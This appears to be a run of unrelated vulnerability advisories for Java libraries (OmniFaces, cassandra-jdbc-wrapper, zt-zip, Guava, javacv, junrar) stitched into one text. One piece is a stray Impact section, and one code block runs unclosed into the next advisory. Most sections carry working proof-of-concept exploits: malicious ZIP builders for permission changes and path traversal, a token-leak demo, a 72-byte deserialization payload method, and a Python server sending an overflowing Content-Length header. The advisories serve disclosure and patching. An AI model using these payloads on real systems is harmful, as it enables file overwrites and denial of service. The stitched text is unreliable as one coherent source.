## Impact

An application that uses `<o:sse>` / `@Push(type=SSE)` with `scope="session"`, `scope="view"`, or a `user` attribute pushes messages intended for one session/user. The channel ID (`channel + "?" + UUID`) is a per-session/view secret carried in the SSE request URL, so it is exposed anywhere such URLs are logged: proxy and server access logs (CWE-598), APM / error reports, `Referer` headers, or a shared/copied link. An attacker who obtains a victim's channel ID can, from a different browser or with no session at all, connect to the SSE endpoint and receive every message the application pushes to that channel — data the scope exists to keep private to the victim. This is the same replay the maintainer fixed for the WebSocket transport in GHSA-fp43-vj7g-pg92 (issue: session/view channels connectable from a foreign or absent HTTP session), still reachable on SSE at 5.4.2. The concrete confidentiality depends on what the application pushes to the scope; the attacker only receives (no message injection). It requires prior exposure of the channel ID, matching the advisory's own threat model for the WebSocket case.

### Summary
The fix for [AIKIDO-2024-10565](https://intel.aikido.dev/cve/AIKIDO-2024-10565) (plaintext password logging) introduced two
redaction helpers — `DriverUtil.toStringWithoutSensitiveValues()` and
`DriverUtil.redactSensitiveValuesInJdbcUrl()` — but both helpers only redact
the `"password"` property/parameter (`JdbcUrlUtil.TAG_PASSWORD`). The equally
sensitive `"token"` property (`JdbcUrlUtil.TAG_TOKEN`), used for DataStax
Astra and other token-based Cassandra authentication, is completely unredacted
by both helpers. Applications using token-based authentication with DEBUG
logging enabled will therefore log the live authentication token in plaintext
via `SessionHolder`'s calls to these same two helpers — the exact same
exposure pattern that the original fix was intended to prevent.

### Details
**File:** `src/main/java/com/ing/data/cassandra/jdbc/utils/DriverUtil.java`

```java
// toStringWithoutSensitiveValues (lines 341-347) -- only redacts "password"
public static String toStringWithoutSensitiveValues(final Properties properties) {
    final Properties withRedactedSensitiveValues = (Properties) properties.clone();
    if (withRedactedSensitiveValues.containsKey(TAG_PASSWORD)) {
        withRedactedSensitiveValues.setProperty(TAG_PASSWORD, "***");
    }
    return withRedactedSensitiveValues.toString();
}

// redactSensitiveValuesInJdbcUrl (lines 355-378) -- only redacts "password"
final String redactedQuery = Arrays.stream(...)
    .map(param -> {
        if (param.startsWith(TAG_PASSWORD + "=")) {
            return TAG_PASSWORD + "=***";
        }
        return param;     // <-- "token=..." passes through unmodified
    })
    ...
```

`JdbcUrlUtil.java` defines `TAG_TOKEN = "token"` (line 407) as a separate,
distinct connection property used when connecting with DataStax Astra-style
token-based authentication. Neither redaction helper checks for this key.

**File:** `src/main/java/com/ing/data/cassandra/jdbc/SessionHolder.java`

Both helpers are called on connection-level properties at DEBUG log level:

```java
// Line 150 — logs all connection properties including "token" unredacted
log.debug("Final Properties to Connection: {}",
    toStringWithoutSensitiveValues(this.properties));

// Lines 173, 190 — logs JDBC URL including "?token=..." unredacted
final String jdbcUrl = redactSensitiveValuesInJdbcUrl(this.cacheKey.get(URL_KEY));
log.debug("Released last reference to {}, closing Session.", jdbcUrl);
log.debug("Acquired reference to {}, new count = {}.", jdbcUrl, ref + 1);
```

DEBUG logging is commonly enabled in production troubleshooting and staging
environments, meaning the token is logged in plain text every time a
connection is acquired or released in such environments.

### PoC
**Environment:** JDK 17+, Maven 3.x

**pom.xml dependency:**
```xml
<dependency>
    <groupId>com.ing.data</groupId>
    <artifactId>cassandra-jdbc-wrapper</artifactId>
    <version>5.0.1</version>
</dependency>
```

**Exploit.java:**
```java
import com.ing.data.cassandra.jdbc.utils.DriverUtil;
import java.util.Properties;

public class Exploit {
    public static void main(String[] args) throws Exception {
        String secretToken = "AstraCS:SUPER_SECRET_TOKEN_VALUE_1234567890";

        // Test 1: redactSensitiveValuesInJdbcUrl()
        String urlWithToken = "jdbc:cassandra://host:9042/ks?token=" + secretToken;
        String redacted = DriverUtil.redactSensitiveValuesInJdbcUrl(urlWithToken);
        System.out.println("Token in 'redacted' URL: " + redacted.contains(secretToken)); // true

        // Test 2: toStringWithoutSensitiveValues()
        Properties props = new Properties();
        props.setProperty("token", secretToken);
        String redactedProps = DriverUtil.toStringWithoutSensitiveValues(props);
        System.out.println("Token in 'redacted' props: " + redactedProps.contains(secretToken)); // true

        // Control: password IS correctly redacted
        Properties propsWithPassword = new Properties();
        propsWithPassword.setProperty("password", "secret");
        System.out.println("Password redacted: " +
            !DriverUtil.toStringWithoutSensitiveValues(propsWithPassword).contains("secret")); // true
    }
}
```

**Result (confirmed, 3/3 reproductions on cassandra-jdbc-wrapper 5.0.1, the latest release):**

```
Token in 'redacted' URL:   true   <- token leaks through the URL redactor
Token in 'redacted' props: true   <- token leaks through the property redactor
Password redacted:         true   <- password IS correctly masked (control)
```

The "redacted" output for a token-based connection string is byte-for-byte
identical to the unredacted original — the helpers have no effect on `token`.

### Impact
**Vulnerability type:** Insertion of Sensitive Information into Log File (CWE-532).

An authentication token (functionally equivalent in sensitivity to a password
— it grants full access to the Cassandra cluster) is written in plaintext to
application log files whenever:
- The application uses token-based authentication (e.g., DataStax Astra), AND
- DEBUG logging is enabled (common in staging environments and during
  production troubleshooting sessions).

An attacker who can read log files — via log aggregation system access,
misconfigured log storage, or a separate log-reading vulnerability — can
extract a live authentication token and use it to authenticate directly to
the Cassandra cluster, accessing all data the token is authorized to read or
write.

This is exactly the same impact class as the original AIKIDO-2024-10565 fix
was intended to prevent — the fix simply missed a second sensitive credential
type that was already present in the codebase.

### Summary
When using one of the `ZipUtil.unpack` overloads, the file permissions of the output directory can be changed. For example, when the output directory was only accessible to the 'owner' it could be instead made accessible to every OS user.

### Details
When the name of a ZIP entry resolves to the output directory itself (e.g. the name `/`), the path traversal checks permit it and then perform actions on that directory, such as applying the file permissions of the ZIP entry to it.

### PoC
This proof of concept requires an OS with support for POSIX file permissions. This issue itself is however not limited to those OS' with POSIX file permissions, see zt-zip's `ZTFilePermissionsUtil.fetchDefaultStrategy` which uses a fallback in that case.

```java
// Uses Apache Commons Compress to create the malicious ZIP file
// The issue itself is however in how zt-zip processes that ZIP file
import org.apache.commons.compress.archivers.zip.AsiExtraField;
import org.apache.commons.compress.archivers.zip.ZipArchiveEntry;
import org.apache.commons.compress.archivers.zip.ZipArchiveOutputStream;
import org.apache.commons.compress.archivers.zip.ZipExtraField;

import org.zeroturnaround.zip.ZipUtil;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Set;

public class ZtZipTest {
    public static void main(String[] args) throws Exception {
        Path zipPath = Path.of("permissions-change.zip");

        Path outputDir = Path.of("permissions-change");
        Files.deleteIfExists(outputDir);
        Files.createDirectory(outputDir);
        Files.setPosixFilePermissions(outputDir, Set.of());

        // outputs "[]"
        System.out.println("Permissions before: " + Files.getPosixFilePermissions(outputDir));

        createZip(zipPath);

        ZipUtil.unpack(zipPath.toFile(), outputDir.toFile());

        // outputs "[..., OTHERS_EXECUTE, OTHERS_WRITE, OTHERS_READ, ...]"
        System.out.println("Permissions after: " + Files.getPosixFilePermissions(outputDir));
    }

    public static void createZip(Path path) throws Exception {
        try (ZipArchiveOutputStream zipStream = new ZipArchiveOutputStream(path)) {
            var entry = new ZipArchiveEntry("/");
            // Set 'allow all' permissions
            entry.setUnixMode(0b1_1111_1111);

            AsiExtraField extraField = new AsiExtraField();
            // Set 'allow all' permissions
            extraField.setMode(0b1_1111_1111);
            entry.setExtraFields(new ZipExtraField[] { extraField });
            zipStream.putArchiveEntry(entry);
            zipStream.closeArchiveEntry();
        }
    }
}

```

### Impact
Affected are users who use `ZipUtil.unpack` to unpack an untrusted ZIP file.

### Summary

`ZipUtil.unpack(...)` rejects ZIP entries that escape the target output directory, but the `Zips` fluent API appears to use a separate unpack implementation that does not apply the same destination-boundary check.

A ZIP entry such as:

```text
../escape/poc.txt
```

is written outside the configured destination directory when processed with:

```java
Zips.get(zip).unpack().destination(outputDir).process();
```

The transformer branch is affected as well.

### Tested Version

commit: 067935dca375500d3ff025aafcdf0e4283931b1a

### Root Cause

In `src/main/java/org/zeroturnaround/zip/Zips.java`, `Zips.UnpackingCallback.process(...)` builds the output file directly from the ZIP entry name:

```java
String entryName = zipEntry.getName();
File file = new File(destination, entryName);
```

The method then creates directories/files and copies content to that path:

```java
FileUtils.forceMkdir(file.getParentFile());
file.createNewFile();
FileUtils.copy(in, file);
```

When a transformer is configured, the same `file` is passed to `transformIntoFile(...)`.

There does not appear to be a canonical path check before these filesystem writes, so `../` entries can resolve outside `destination`.

### Minimal Reproduction

```java
import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.zip.*;

import org.zeroturnaround.zip.ZipUtil;
import org.zeroturnaround.zip.Zips;
import org.zeroturnaround.zip.transform.ZipEntryTransformer;

public class ZipsTraversalPoc {
  public static void main(String[] args) throws Exception {
    Path work = Files.createTempDirectory("ztzip-zips-poc");
    Path zip = work.resolve("poc.zip");
    Path escaped = work.resolve("escape").resolve("poc.txt");
    String entryName = "../escape/poc.txt";

    Files.createDirectories(escaped.getParent());

    try (ZipOutputStream zos = new ZipOutputStream(Files.newOutputStream(zip))) {
      zos.putNextEntry(new ZipEntry(entryName));
      zos.write("plain branch\n".getBytes(StandardCharsets.UTF_8));
      zos.closeEntry();
    }

    Path zipUtilOut = work.resolve("ziputil-out");
    Files.createDirectories(zipUtilOut);
    try {
      ZipUtil.unpack(zip.toFile(), zipUtilOut.toFile());
      System.out.println("ZIPUTIL_REJECTED=false");
    }
    catch (Throwable t) {
      System.out.println("ZIPUTIL_REJECTED=" + t.getClass().getName());
    }
    System.out.println("ZIPUTIL_ESCAPED_EXISTS=" + Files.exists(escaped));

    Files.deleteIfExists(escaped);

    Path zipsOut = work.resolve("zips-out");
    Files.createDirectories(zipsOut);
    Zips.get(zip.toFile()).unpack().destination(zipsOut.toFile()).process();
    System.out.println("ZIPS_PLAIN_ESCAPED_EXISTS=" + Files.exists(escaped));
    System.out.println("ZIPS_PLAIN_ESCAPED_OUTSIDE_ROOT=" + !escaped.normalize().startsWith(zipsOut.normalize()));

    Files.deleteIfExists(escaped);

    Path zipsTransformOut = work.resolve("zips-transform-out");
    Files.createDirectories(zipsTransformOut);
    Zips.get(zip.toFile())
        .unpack()
        .destination(zipsTransformOut.toFile())
        .addTransformer(entryName, new ZipEntryTransformer() {
          public void transform(InputStream in, ZipEntry entry, ZipOutputStream out) throws IOException {
            out.putNextEntry(new ZipEntry(entry.getName()));
            out.write("transform branch\n".getBytes(StandardCharsets.UTF_8));
            out.closeEntry();
          }
        })
        .process();
    System.out.println("ZIPS_TRANSFORM_ESCAPED_EXISTS=" + Files.exists(escaped));
    System.out.println("ZIPS_TRANSFORM_ESCAPED_OUTSIDE_ROOT=" + !escaped.normalize().startsWith(zipsTransformOut.normalize()));
  }
}
```

Observed output:

```text
ZIPUTIL_REJECTED=org.zeroturnaround.zip.MaliciousZipException
ZIPUTIL_ESCAPED_EXISTS=false
ZIPS_PLAIN_ESCAPED_EXISTS=true
ZIPS_PLAIN_ESCAPED_OUTSIDE_ROOT=true
ZIPS_TRANSFORM_ESCAPED_EXISTS=true
ZIPS_TRANSFORM_ESCAPED_OUTSIDE_ROOT=true
```

### Expected Behavior

`Zips.get(zip).unpack().destination(outputDir).process()` should reject traversal entries or otherwise ensure that the resolved output path remains inside `outputDir`.

### Impact

Applications that unpack attacker-controlled ZIP files through the `Zips` fluent API may allow arbitrary file writes outside the intended extraction directory, depending on filesystem permissions and application layout.

### Suggested Fix

Apply the same destination-boundary validation used by `ZipUtil.unpack(...)` before any filesystem write in `Zips.UnpackingCallback.process(...)`.

For example, compare canonical `Path` values before creating directories or files:

```java
file.getCanonicalFile().toPath()
    .startsWith(destination.getCanonicalFile().toPath())
```

Regression tests should cover both:

```java
Zips.get(zip).unpack().destination(out).process();
Zips.get(zip).unpack().destination(out).addTransformer(...).process();

# CompactHashMap/CompactHashSet/MapMakerInternalMap native deserialization triggers uncontrolled memory allocation

## Summary

`CompactHashMap`, `CompactHashSet`, and `MapMakerInternalMap` implement `readObject(ObjectInputStream)` by reading an attacker-controlled `elementCount` or `initialCapacity` from the stream. On the very first insertion during or after deserialization (for the `CompactHash*` collections, inside `allocArrays()`) or immediately during deserialization (for `MapMakerInternalMap`), the implementation eagerly allocates arrays sized to that full, unvalidated value (up to `CompactHashing.MAX_SIZE` = 2^30-1, ~1.07 billion, for example) before the rest of the stream's actual content has been consumed. A 72-byte malicious serialized stream containing a single tiny element can force a multi-gigabyte allocation and crash a JVM with `OutOfMemoryError`, dynamically confirmed against the current release.

## Details

`CompactHashMap.readObject()` (`guava/src/com/google/common/collect/CompactHashMap.java`):

```java
private void readObject(ObjectInputStream stream) throws IOException, ClassNotFoundException {
  stream.defaultReadObject();
  int elementCount = stream.readInt();
  if (elementCount < 0) {
    throw new InvalidObjectException("Invalid size: " + elementCount);
  }
  init(elementCount);
  for (int i = 0; i < elementCount; i++) {
    K key = (K) stream.readObject();
    V value = (V) stream.readObject();
    put(key, value);
  }
}
```

`elementCount` is only checked for being non-negative; there is no upper bound and no relationship enforced between the declared count and how much data actually follows in the stream. `init(elementCount)` (line 251) just stores the value (clamped to `[1, CompactHashing.MAX_SIZE]`, i.e. up to 2^30-1):

```java
void init(int expectedSize) {
  Preconditions.checkArgument(expectedSize >= 0, "Expected size must be >= 0");
  this.metadata = Ints.constrainToRange(expectedSize, 1, CompactHashing.MAX_SIZE);
}
```

The real allocation is deferred to `allocArrays()`, which fires lazily on the *first* `put()` call — i.e. after only one key/value pair has actually been read off the wire:

```java
int allocArrays() {
  ...
  int expectedSize = metadata;
  int buckets = CompactHashing.tableSize(expectedSize);
  this.table = CompactHashing.createTable(buckets);
  setHashTableMask(buckets - 1);
  this.entries = new int[expectedSize];
  this.keys = new Object[expectedSize];
  this.values = new Object[expectedSize];
  return expectedSize;
}
```

With `expectedSize` near `CompactHashing.MAX_SIZE` (2^30-1), this single call allocates a hash `table` plus three `expectedSize`-length arrays — multiple gigabytes — triggered by a stream that has, at that point, only supplied one small real element. `CompactHashSet.readObject()`/`allocArrays()` have the identical shape. `CompactLinkedHashMap`/`CompactLinkedHashSet` extend these classes and inherit the same unguarded path.

The problem with `MapMakerInternalMap` is similar, with [a size read from the serialized data and stored in a `MapMaker` instance](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L2848-L2851) for [later user during deserialization](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L2897), when [the `MapMaker` is passed back to `MapMakerInternalMap`](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMaker.java#L287) and [segments are allocated](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L173-L200) by [calling `newSegment`](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L1143), whose implementations ([example](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L443)) create `Segment` instances ([example](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L2019)) that [allocate arrays of the requested capacity](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L1234) through [the `newTable`](https://github.com/google/guava/blob/1278ad9c2257f48dc82fb7b7c625ab563605aa24/guava/src/com/google/common/collect/MapMakerInternalMap.java#L1262) helper.

This is the same amplification shape as the already-fixed **CVE-2018-10237** (`AtomicDoubleArray`/`CompoundOrdering`: attacker declares a large size, library eagerly allocates before validating against actual stream content). That fix rewrote `AtomicDoubleArray.readObject()` to grow an `ImmutableLongArray.Builder` incrementally per element actually read, rather than pre-allocating from the declared size — Guava's own `HashBiMap.readObject()` documents the same defensive principle explicitly in a comment: `init(16); // resist hostile attempts to allocate gratuitous heap`. `CompactHashMap`/`CompactHashSet` do not follow either of these two patterns already present elsewhere in the same codebase.

**Reachability**: All classes are top-level, `implements ... Serializable`, and require no special classpath setup beyond Guava being present (near-ubiquitous on JVM backends). A native Java deserialization attacker names the class directly in a hand-crafted stream — no particular Guava factory method needs to have been used by the victim application, exactly as with the precedent CVE.

## PoC

Full source and run instructions in the attached `poc-guava-compacthash-dos.zip` (Maven project, `guava:33.7.1-jre` — the current latest release — as the only dependency). The PoC:

1. Uses reflection only to legitimately obtain a `CompactHashSet` instance (it is package-private; a real attacker does not need this step, since they craft the serialized bytes directly rather than calling Guava's own serialization code).
2. Serializes one set with 1 element and one with 2 elements, diffs the two byte streams to locate the exact offset of the `elementCount` field (byte-precise, not guessed).
3. Patches that one 4-byte field in the 1-element stream from `1` to `0x3FFFFFFF` (`CompactHashing.MAX_SIZE`), leaving the rest of the 72-byte stream (one real `"A"` element) untouched.
4. Feeds the resulting 72-byte malicious stream into a plain `new ObjectInputStream(...).readObject()` call against the real, unmodified `guava-33.7.1-jre.jar`.

Actual run output:

```
### -Xmx8g (generous heap) ###
Located size field at offset 63, value=1 (expected 1)
Malicious stream size: 72 bytes
Declared elementCount: 1073741823 (~1.07 billion)
Real payload: 1 tiny string element ("A")
=== RESULT ===
Exception: java.lang.OutOfMemoryError: Java heap space
Time to allocate+fail: 4013 ms
Heap used before: 3 MB
Heap used after (at failure point): 4103 MB
JVM max heap (-Xmx): 8192 MB

### -Xmx128m (ordinary service-sized heap) ###
Located size field at offset 63, value=1 (expected 1)
Malicious stream size: 72 bytes
Declared elementCount: 1073741823 (~1.07 billion)
Real payload: 1 tiny string element ("A")
=== RESULT ===
Exception: java.lang.OutOfMemoryError: Java heap space
Time to allocate+fail: 24 ms
Heap used before: 4 MB
Heap used after (at failure point): 2 MB
JVM max heap (-Xmx): 128 MB
```

A 72-byte input forces ~4.1 GB of real allocation before failing on an 8 GB heap, and crashes a 128 MB heap in 24 ms — over 50,000x amplification between input size and forced allocation.

To reproduce: `mvn -q compile dependency:build-classpath -Dmdep.outputFile=cp.txt && java -Xmx128m -cp "target/classes:$(cat cp.txt)" poc.Poc`

## Impact

Uncontrolled resource consumption (CWE-770 / CWE-400) via native Java deserialization: any application that runs `ObjectInputStream.readObject()` on data reachable by an attacker, and has Guava on its classpath (true for a large fraction of the JVM ecosystem), can be crashed with a single ~72-byte payload, regardless of what type the application itself expected to deserialize.

## Severity

CVSS 3.1: `AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H` — identical vector to CVE-2018-10237, the precedent this is a sibling of. Recomputed with the full formula: exploitability = 8.22×0.85×0.44×0.85×0.85 = 2.221; ISS = 1-(1×1×0.44) = 0.56; impact = 6.42×0.56 = 3.595; base = roundup(5.816) = **5.9 (Medium)**.

## Affected

`com.google.guava:guava`, all editions (`-jre`/`-android`) — confirmed on the current latest release, 33.7.1-jre. `CompactHashMap`/`CompactHashSet`/`CompactLinkedHashMap`/`CompactLinkedHashSet` have had this same `readObject`/`allocArrays` shape for a long time (probably since they were added in Guava 23.6), and similarly for `MapMakerInternalMap` (which was introduced in Guava 4.0); not tested against older individual releases.

## Suggested fix

Apply the same defense already used elsewhere in this codebase: either clamp the initial `init()` capacity to a small constant regardless of the declared `elementCount` (as `HashBiMap.readObject()` already does — `init(16); // resist hostile attempts to allocate gratuitous heap`) and grow incrementally as elements are actually read, or grow the backing arrays incrementally per iteration of the deserialization loop (as the fixed `AtomicDoubleArray.readObject()` does via `ImmutableLongArray.Builder`) instead of eagerly sizing to the full attacker-declared count on first insert.

### Summary
`IPCameraFrameGrabber` parses the `Content-Length` value from the multipart MJPEG HTTP stream returned by the configured IP camera without any bounds checking. A malicious or compromised camera endpoint - or any network attacker able to tamper with the plaintext HTTP response (these streams are conventionally accessed over `http://`, as documented in the class itself) - can supply a `Content-Length` value in the range `1073741825`-`2147483647`. This drives the internal buffer-growth routine `ensureBufferCapacity(int)` into 32-bit signed integer overflow, which turns the "grow the buffer" loop into a true infinite loop: the loop variable oscillates to `0` and never again satisfies the loop's exit condition. The thread that called `grab()`/`grabBufferedImage()` spins at 100% CPU forever and never returns, permanently hanging the calling application's frame-grabbing thread with no exception, timeout, or interrupt path available to the caller.

### Details
File: `src/main/java/org/bytedeco/javacv/IPCameraFrameGrabber.java`

```java
private byte[] readImage() throws IOException {
    ...
    int c0 = subheader.indexOf("content-length: ");
    final int c1 = subheader.indexOf('\r', c0);
    if (c0 < 0) {
        throw new EOFException("The camera stream ended unexpectedly");
    }
    c0 += 16;
    final int contentLength = Integer.parseInt(subheader.substring(c0, c1).trim());   // <-- fully attacker-controlled
    // adaptive size - careful - don't want a 2G jpeg
    ensureBufferCapacity(contentLength);                                              // <-- no upper bound enforced
    input.readFully(pixelBuffer, 0, contentLength);
    ...
}

private void ensureBufferCapacity(int desiredCapacity) {
    int capacity = pixelBuffer.length;          // starts at 1024
    while (capacity < desiredCapacity) {
        capacity *= 2;                          // <-- unchecked int multiplication
    }
    if (capacity > pixelBuffer.length) {
        pixelBuffer = new byte[capacity];
    }
}
```

`contentLength` is taken verbatim from the HTTP response headers of the camera stream and passed directly into `ensureBufferCapacity` with no upper-bound validation (the comment "adaptive size - careful - don't want a 2G jpeg" shows the author was aware of the risk but never implemented a check).

`ensureBufferCapacity` repeatedly doubles `capacity` (a 32-bit `int`, starting at `pixelBuffer.length == 1024`) until it is `>= desiredCapacity`. If `desiredCapacity` is greater than `2^30` (`1073741824`) but `<= Integer.MAX_VALUE` (`2147483647`):

1. `capacity` reaches `2^30` (`1073741824`) after 20 doublings; the loop condition `capacity < desiredCapacity` is still true.
2. `capacity *= 2` computes `2^31`, which overflows a signed 32-bit `int` and wraps to `Integer.MIN_VALUE` (`-2147483648`).
3. The loop condition `capacity < desiredCapacity` (a negative number compared to a large positive `desiredCapacity`) is still true, so the loop continues.
4. `capacity *= 2` computes `Integer.MIN_VALUE * 2`, which in two's-complement 32-bit arithmetic wraps to `0`.
5. From this point on, `capacity` is permanently `0` (`0 * 2 == 0`), and `0 < desiredCapacity` remains true forever - the `while` loop never terminates.

This is a pure CPU-bound loop with no I/O, no blocking call, and no `InterruptedException` check, so it cannot be interrupted via `Thread.interrupt()` and will not respect any `readTimeout`/`connectionTimeout` configured on the grabber (those only apply to the socket read that happens *before* this code path). The only remedy is killing the JVM/thread from outside.

### PoC
A minimal malicious/MITM'd MJPEG server that reproduces the hang:

```python
import socket

srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", 8080))
srv.listen(1)
print("listening on :8080")
conn, _ = srv.accept()
conn.recv(4096)  # swallow the client's request

# Any value in (1073741824, 2147483647] triggers the overflow.
malicious_length = 2000000000
header = (
    "--myboundary\r\n"
    "Content-Type: image/jpeg\r\n"
    "Content-Length: %d\r\n\r\n" % malicious_length
)
conn.sendall(header.encode())
# The client will now spin forever inside ensureBufferCapacity()
# before ever attempting to read the (fake) body.
```

Java client (representative of any application embedding javacv to view an "IP camera" URL):

```java
import org.bytedeco.javacv.IPCameraFrameGrabber;
import java.util.concurrent.TimeUnit;

public class Poc {
    public static void main(String[] args) throws Exception {
        IPCameraFrameGrabber grabber = new IPCameraFrameGrabber(
            "http://127.0.0.1:8080/videostream.cgi", 5, 5, TimeUnit.SECONDS);
        grabber.start();
        grabber.grab(); // never returns; thread pegs a CPU core at 100% forever
    }
}
```

Running the client against the malicious server above causes `grab()` to hang permanently, consuming a full CPU core, regardless of the `startTimeout`/`grabTimeout` passed to the constructor.

### Impact
Any application that uses `IPCameraFrameGrabber` to consume a camera/MJPEG stream from a source that is not fully trusted - including the common case of plain `http://` streams (as shown in the class's own documented examples: `http://host/videostream.cgi?...`) that can be tampered with by a network-position attacker - can be forced into a permanent, unrecoverable CPU-spinning hang of the grabbing thread by a single crafted response header. No authentication, JPEG payload, or actual data transfer is required; the malicious header alone is sufficient. Repeated exploitation against a server that spawns a grabber thread per client/camera (a common pattern for video-surveillance/monitoring backends) can exhaust available threads/CPU, resulting in a broader denial of service.

### Summary

Junrar's RAR virtual machine can be forced into a deterministic infinite loop while extracting a crafted RAR4 archive. The `RarVM.ExecuteCode` loop is intended to be bounded by `maxOpCount`, but jump instructions can bypass this limit when `setIP()` is called with a target instruction pointer greater than or equal to `codeSize`.

An unauthenticated attacker who can provide a RAR archive to an application using `Junrar.extract()` can cause the extraction thread to spin forever, consuming CPU and blocking the process. The issue is a denial of service vulnerability, not remote code execution.

### Details

The root cause is in `src/main/java/com/github/junrar/unpack/vm/RarVM.java`.

`setIP()` returns early when the target IP is outside the prepared VM program:

```java
private boolean setIP(int ip) {
    if ((ip) >= codeSize) {
        return (true);
    }

    if (--maxOpCount <= 0) {
        return (false);
    }

    IP = ip;
    return true;
}
```

When `ip >= codeSize`, this branch:

- does not update `IP`;
- does not decrement `maxOpCount`;
- returns `true`, so callers treat it as success.

The `VM_JMP` handler and the other jump-like handlers discard the return value of `setIP()` and immediately `continue` the main VM loop:

```java
case VM_JMP:
    setIP(getValue(false, mem, op1));
    continue;
```

Because of the `continue`, execution also skips the loop-end accounting:

```java
IP++;
--maxOpCount;
```

As a result, a VM program containing a single `VM_JMP` instruction can freeze both `IP` and `maxOpCount`:

1. `IP` points to the `VM_JMP` instruction.
2. The jump target resolves to `codeSize` or larger.
3. `setIP()` returns before modifying `IP` or decrementing `maxOpCount`.
4. The caller ignores the return value and continues.
5. The same `VM_JMP` instruction is executed again forever.

### Impact

This is a CPU denial of service vulnerability. Any application that uses junrar to extract untrusted RAR archives can have an extraction worker thread permanently blocked by a small crafted archive. In services that process uploads or attachments automatically, repeated submissions can exhaust worker capacity and degrade or stop archive-processing functionality.

The RAR VM does not provide native code execution, reflection, or process execution primitives, and Java array bounds checks prevent escaping the VM memory array. The expected security impact is availability only.
